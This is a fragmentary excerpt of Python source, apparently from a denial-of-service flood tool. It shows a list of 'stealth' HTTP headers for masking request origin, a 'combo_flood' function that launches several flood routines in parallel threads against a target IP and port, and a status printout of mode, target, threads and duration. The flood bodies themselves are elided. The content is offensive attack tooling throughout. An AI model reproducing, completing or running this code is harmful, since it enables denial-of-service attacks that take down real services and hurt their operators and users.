...
STEALTH_HEADERS = ["X-Forwarded-For", "Referer", "Origin", "Cache-Control", "X-Real-IP"]
...
def combo_flood(ip, port, duration, threads):
    ...
    for func in flood_funcs:
        threading.Thread(
            target=func, args=(ip, port, duration, threads), daemon=True
        ).start()
...
def parse_trigger(args):
    ...
    print(
        f"[✓] Mode: {mode.upper()} | Target: {ip}:{port} | Threads: {threads} | Duration: {duration}s"
    )
